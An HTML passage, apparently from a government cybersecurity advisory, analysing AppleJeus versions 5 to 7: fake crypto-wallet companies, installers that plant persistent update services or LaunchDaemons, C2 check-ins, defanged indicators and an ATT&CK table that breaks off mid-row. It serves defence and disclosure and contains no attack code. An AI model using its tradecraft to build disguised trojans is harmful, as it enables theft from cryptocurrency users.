&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In early 2020, another version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called CoinGoTrade on their website &lt;code&gt;coingotrade[.]com&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;CoinGoTrade[.]com&lt;/code&gt; resolved to IP address &lt;code&gt;198.54.114[.]175&lt;/code&gt; from February 28, 2020, to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for &lt;code&gt;Dorusio[.]com&lt;/code&gt; and &lt;code&gt;Ants2Whale[.]com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;CoinGoTrade[.]com&lt;/code&gt; had a valid Sectigo SSL certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;CoinGoTrade Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Windows Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will execute the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;CoinGoTrade.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files (x86)\CoinGoTrade&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;CoinGoTradeUpdate.exe&lt;/code&gt; in folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\CoinGoTradeSupport&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;CoinGoTradeUpdate.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;CoinGoTrade.exe&lt;/code&gt; loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;CoinGoTradeUpdate.exe&lt;/code&gt; first installs itself as a service (&lt;em&gt;Create or Modify System Process: Windows Service &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003"&gt;T1543.003&lt;/a&gt;]), which will automatically start when any user logs on (&lt;em&gt;Boot or Logon Autostart Execution &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1547/"&gt;T1547&lt;/a&gt;]). The service is installed with a description stating it is an “Automatic CoinGoTrade Upgrade.” When launched, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), combines the information in strings before exfiltration, and sends it to a C2 website (&lt;em&gt;Exfiltration Over C2&lt;/em&gt; &lt;em&gt;Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;macOS X Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;CoinGoTrade&lt;/code&gt; in folder &lt;code&gt;/Applications/CoinGoTrade.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt; in folder &lt;code&gt;/Applications/CoinGoTrade.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Creates &lt;code&gt;CoinGoTradeService&lt;/code&gt; folder in &lt;code&gt;/Library/Application Support&lt;/code&gt; folder&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt; to the new folder&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;com.coingotrade.pkg.product.plist&lt;/code&gt; to folder &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt; in the background&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;CoinGoTrade&lt;/code&gt; program is likely a copy of an open-source cryptocurrency wallet application and loads a legitimate-looking, fully functional wallet program).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt; program calls its function &lt;code&gt;CheckUpdate&lt;/code&gt; (which contains most of the logic functionality of the malware) and sends a &lt;code&gt;POST&lt;/code&gt; to the C2 server with a connection named “CoinGoTrade 1.0 (Check Update Osx)” (&lt;em&gt;Application Layer Protocol: Web Protocols&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001]&lt;/a&gt;). If the C2 server returns a file, it is decoded and written to the victim’s folder &lt;code&gt;/private/tmp/updatecoingotrade&lt;/code&gt; with permissions set by the command &lt;code&gt;chmod 700&lt;/code&gt; (only the user can read, write, and execute) (&lt;em&gt;Command and&lt;/em&gt; &lt;em&gt;Scripting Interpreter &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/"&gt;T1059&lt;/a&gt;]). Stage 2 is then launched, and the malware, &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt;, returns to sleeping and checking in with the C2 server at predetermined intervals (&lt;em&gt;Application Layer Protocol: Web Protocols&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;postinstall&lt;/code&gt; script has similar functionality to the other scripts (&lt;em&gt;Command and Scripting Interpreter: Unix Shell&amp;nbsp;&lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/004/"&gt;T1059.004&lt;/a&gt;]) and installs &lt;code&gt;CoinGoTrade&lt;/code&gt; and &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt; in folder &lt;code&gt;/Applications/CoinGoTrade.app/Contents/MacOS/&lt;/code&gt;. It moves the property list (plist) file &lt;code&gt;com.coingotrade.pkg.product.plist&lt;/code&gt; to the &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt; folder (&lt;em&gt;Scheduled Task/Job: Launchd &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/004/"&gt;T1053.004&lt;/a&gt;]). Because the &lt;code&gt;LaunchDaemon&lt;/code&gt; will not run automatically after the &lt;code&gt;plist&lt;/code&gt; file is moved, the &lt;code&gt;postinstall&lt;/code&gt; script launches &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt; and runs it in the background (&lt;em&gt;Create or Modify&lt;/em&gt; &lt;em&gt;System Process: Launch Daemon&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/004/"&gt;T1543.004&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Payload&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The Windows malware’s payload could not be downloaded because the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the payload. The Windows payload is likely similar in functionality to the macOS X stage 2 detailed below.&lt;/p&gt;

&lt;p&gt;The stage 2 payload for the macOS X malware was no longer available from the specified download URL. Still, a file was submitted to VirusTotal by the same user on the same date as the macOS X &lt;code&gt;CoinGoTradeUpgradeDaemon&lt;/code&gt;. These clues suggest that the submitted file may be related to the macOS X version of the malware and the downloaded payload.&lt;/p&gt;

&lt;p&gt;The file &lt;code&gt;prtspool&lt;/code&gt; is a 64-bit Mach-O executable with a large variety of features that have all been confirmed as functionality. The file has three C2 URLs hardcoded into the file and communicates to these with HTTP POST multipart-form data boundary string. Like other HIDDEN COBRA malware, &lt;code&gt;prtspool&lt;/code&gt; uses format strings to store data collected about the system and sends it to the C2s.&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 5: CoinGoTrade, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048e"&gt;MAR-10322463-5.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus Version 6: Dorusio&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In March 2020, an additional version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called Dorusio on their website, &lt;code&gt;dorusio[.]com&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]). Researchers collected samples for Windows and macOS X versions of the Dorusio Wallet (&lt;em&gt;Develop Capabilities: Malware&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1587/001/"&gt;T1587.001&lt;/a&gt;]). As of at least early 2020, the actual download links result in &lt;code&gt;404&lt;/code&gt; errors. The download page has release notes with version revisions claiming to start with version 1.0.0, released on April 15, 2019.&lt;/p&gt;

&lt;p&gt;The domain &lt;tt&gt;dorusio[.]com&lt;/tt&gt; resolved to IP address &lt;code&gt;198.54.115[.]51&lt;/code&gt; from March 30, 2020 to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for &lt;code&gt;CoinGoTrade[.]com&lt;/code&gt; and &lt;code&gt;Ants2Whale[.]com.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;dorusio[.]com&lt;/code&gt; had a valid Sectigo SSL certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Dorusio Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;em&gt;&lt;strong&gt;Windows Program&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will install the following two programs.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;Dorusio.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files (x86)\Dorusio&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;DorusioUpgrade.exe&lt;/code&gt; in folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\DorusioSupport&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;DorusioUpgrade.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The program, &lt;code&gt;Dorusio.exe&lt;/code&gt;, loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.&lt;/p&gt;

&lt;p&gt;The program &lt;code&gt;DorusioUpgrade.exe&lt;/code&gt; first installs itself as a service (&lt;em&gt;Create or Modify System Process:&lt;/em&gt; &lt;em&gt;Windows Service&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003"&gt;T1543.003&lt;/a&gt;]), which will automatically start when any user logs on (&lt;em&gt;Boot or Logon Autostart Execution&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1547/"&gt;T1547&lt;/a&gt;]). The service is installed with a description stating it “Automatic Dorusio Upgrade.” When launched, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), combines the information in strings before exfiltration, and sends it to a C2 website (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;em&gt;&lt;strong&gt;macOS X Program&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;Dorusio&lt;/code&gt; in folder &lt;code&gt;/Applications/Dorusio.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;Dorusio_upgrade&lt;/code&gt; in folder &lt;code&gt;/Applications/Dorusio.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Creates &lt;code&gt;DorusioDaemon&lt;/code&gt; folder in &lt;code&gt;/Library/Application Support&lt;/code&gt; folder&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;Dorusio_upgrade&lt;/code&gt; to the new folder&lt;/li&gt;
		&lt;li&gt;Moves &lt;code&gt;com.dorusio.pkg.wallet.plist&lt;/code&gt; to folder &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;Dorusio_upgrade&lt;/code&gt; in the background&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;Dorusio&lt;/code&gt; program is likely a copy of an open-source cryptocurrency wallet application and loads a legitimate-looking wallet program (fully functional). Aside from the Dorusio logo and two new services, the wallet appears to be the same as the Kupay Wallet. This application seems to be a modification of the open-source cryptocurrency wallet Copay distributed by Atlanta-based company BitPay.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;Dorusio_upgrade&lt;/code&gt; program calls its function &lt;code&gt;CheckUpdate&lt;/code&gt; (which contains most of the logic functionality of the malware) and sends a &lt;code&gt;POST&lt;/code&gt; to the C2 server with a connection named “&lt;em&gt;Dorusio Wallet 2.1.0 (Check Update Osx)&lt;/em&gt;” (&lt;em&gt;Application Layer Protocol: Web Protocols&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001]&lt;/a&gt;). If the C2 server returns a file, it is decoded and written to the victim’s folder &lt;code&gt;/private/tmp/Dorusio_update&lt;/code&gt; with permissions set by the command &lt;code&gt;chmod 700&lt;/code&gt; (only the user can read, write, and execute) (&lt;em&gt;Command and Scripting Interpreter &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/"&gt;T1059&lt;/a&gt;]). Stage 2 is then launched, and the malware, &lt;code&gt;Dorusio_upgrade&lt;/code&gt;, returns to sleeping and checking in with the C2 server at predetermined intervals (&lt;em&gt;Application Layer Protocol: Web Protocols&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;postinstall&lt;/code&gt; script has similar functionality to other AppleJeus scripts (&lt;em&gt;Command and Scripting Interpreter: Unix Shell&lt;/em&gt;&amp;nbsp;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/004/"&gt;T1059.004&lt;/a&gt;]). It creates the &lt;code&gt;DorusioDaemon&lt;/code&gt; folder in &lt;code&gt;/Library/Application Support&lt;/code&gt; folder and then moves &lt;code&gt;Dorusio_upgrade&lt;/code&gt; to the new folder. It moves the property list (&lt;code&gt;plist&lt;/code&gt;) file &lt;code&gt;com.dorusio.pkg.wallet.plist&lt;/code&gt; from the Installer package to the &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt; folder (&lt;em&gt;Scheduled Task/Job: Launchd &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/004/"&gt;T1053.004]&lt;/a&gt;). Because the &lt;code&gt;LaunchDaemon&lt;/code&gt; will not run automatically after the &lt;code&gt;plist&lt;/code&gt; file is moved, the &lt;code&gt;postinstall&lt;/code&gt; script launches &lt;code&gt;Dorusio_upgrade&lt;/code&gt; and runs it in the background (&lt;em&gt;Create or Modify System Process: Launch Daemon&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/004/"&gt;T1543.004&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;em&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;Neither the payload for the Windows nor macOS X malware could be downloaded; the C2 server is no longer accessible. The payloads are likely similar in functionality to the macOS X stage 2 from CoinGoTrade and Kupay Wallet, or the Windows stage 2 from Union Crypto.&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 6: Dorusio, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048f"&gt;MAR-10322463-6.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus 4, 5, and 6 Installation Conflictions&lt;/h3&gt;

&lt;p&gt;If a user attempts to install the Kupay Wallet, CoinGoTrade, and Dorusio applications on the same system, they will encounter installation conflicts.&lt;/p&gt;

&lt;p&gt;If Kupay Wallet is already installed on a system and the user tries to install CoinGoTrade or Dorusio:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Pop-up windows appear, stating a more recent version of the program is already installed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If CoinGoTrade is already installed on a system and the user attempts to install Kupay Wallet:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;Kupay.exe&lt;/code&gt; will be installed in the &lt;code&gt;C:\Program Files (x86)\CoinGoTrade\ folder&lt;/code&gt;.&lt;/li&gt;
	&lt;li&gt;All &lt;code&gt;CoinGoTrade&lt;/code&gt; files will be deleted.&lt;/li&gt;
	&lt;li&gt;The folders and files contained in the &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\CoinGoTradeSupport&lt;/code&gt; will remain installed.&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;KupayUpgrade.exe&lt;/code&gt; is installed in the new folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\KupaySupport&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If Dorusio is already installed on a system and the user attempts to install Kupay Wallet:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;Kupay.exe&lt;/code&gt; will be installed in the &lt;code&gt;C:\Program Files (x86)\Dorusio\ folder&lt;/code&gt;.&lt;/li&gt;
	&lt;li&gt;All &lt;code&gt;Dorusio.exe&lt;/code&gt; files will be deleted.&lt;/li&gt;
	&lt;li&gt;The folders and files contained in &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\DorusioSupport&lt;/code&gt; will remain installed.&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;KupayUpgrade.exe&lt;/code&gt; is installed in the new folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\KupaySupport&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 class="italic"&gt;AppleJeus Version 7: Ants2Whale&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In late 2020, a new version of AppleJeus was identified called “Ants2Whale.” The site for this version of AppleJeus is &lt;code&gt;ants2whale[.]com&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]). The website shows a legitimate-looking cryptocurrency company and application. The website contains multiple spelling and grammar mistakes indicating the creator may not have English as a first language. The website states that to download Ants2Whale, a user must contact the administrator, as their product is a “premium package” (&lt;em&gt;Develop Capabilities: Malware&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1587/001/"&gt;T1587.001&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;ants2whale[.]com&lt;/code&gt; resolved to IP address &lt;code&gt;198.54.114[.]237&lt;/code&gt; from September 23, 2020, to January 22, 2021. The IP address is controlled by NameCheap, Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for &lt;code&gt;CoinGoTrade[.]com&lt;/code&gt; and &lt;code&gt;Dorusio[.]com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The domain &lt;code&gt;ants2whale[.]com&lt;/code&gt; had a valid Sectigo SSL certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Ants2Whale Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Windows Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;As of late 2020, the Windows program was not available on VirusTotal. It is likely very similar to the macOS X version detailed below.&lt;/p&gt;

&lt;h4&gt;&lt;em&gt;&lt;strong&gt;macOS X Program&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;Ants2Whale&lt;/code&gt; in folder &lt;code&gt;/Applications/Ants2whale.app/Contents/MacOS/Ants2whale&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;Ants2WhaleHelper&lt;/code&gt; in folder &lt;code&gt;/Library/Application Support/Ants2WhaleSupport/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Moves &lt;code&gt;com.Ants2whale.pkg.wallet.plist&lt;/code&gt; to folder &lt;code&gt;/Library/LaunchDaemons/&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;Ants2WhaleHelper&lt;/code&gt; in the background&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;Ants2Whale&lt;/code&gt; and &lt;code&gt;Ants2WhaleHelper&lt;/code&gt; programs and the &lt;code&gt;postinstall&lt;/code&gt; script function almost identically to previous versions of AppleJeus and will not be discussed in depth in this advisory.&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 7: Ants2Whale, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048g"&gt;MAR-10322463-7.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;ATT&amp;amp;CK Profile&lt;/h3&gt;

&lt;p&gt;Figure 2 and table 2 provide summaries of the MITRE ATT&amp;amp;CK techniques observed.&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="74fbbb9b-5cf7-4450-8749-625a97dccec7" height="362" src="https://us-cert.cisa.gov/sites/default/files/publications/AppleJeus%20AA%20Figure%202.jpg" width="690" /&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Figure 2: MITRE ATT&amp;amp;CK enterprise techniques used by AppleJeus&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 2: MITRE ATT&amp;amp;CK techniques observed&lt;/em&gt;&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-left: auto; margin-right: auto;"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Tactic Title&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Technique ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col"&gt;&lt;strong&gt;Technique Title &lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0042/"&gt;Resource Development [TA0042]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1583.001&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Acquire Infrastructure: Domain&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0042/"&gt;Resource Development [TA0042]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1583.006&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Acquire Infrastructure: Web Services&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0042/"&gt;Resource Development [TA0042]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1587.001&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Develop Capabilities: Malware&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0042/"&gt;Resource Development [TA0042]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1588.003&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Obtain Capabilities: Code Signing Certificates&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0042/"&gt;Resource Development [TA0042]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1588004&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Obtain Capabilities: Digital Certificates&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0001"&gt;Initial Access [TA0001]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;span style="font-size:11.0pt;line-height:115%;
font-family:&amp;quot;Arial&amp;quot;,sans-serif;mso-fareast-font-family:Calibri;mso-fareast-theme-font:
minor-latin;mso-bidi-font-family:&amp;quot;Times New Roman&amp;quot;;mso-bidi-theme-font:minor-bidi;
mso-ansi-language:EN-US;mso-fareast-language:EN-US;mso-bidi-language:AR-SA"&gt;T1566.002&lt;/span&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Phishing: Spearphishing Link&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0002"&gt;Execution [TA0002]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1059&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Command and Scripting Interpreter&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0002"&gt;Execution [TA0002]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1059.004&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Command and Scripting Interpreter: Unix Shell&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0002"&gt;Execution [TA0002]&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;T1204.002&lt;/td&gt;
			&lt;td scope="col" style="text-align: left;"&gt;User Execution: Malicious File&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
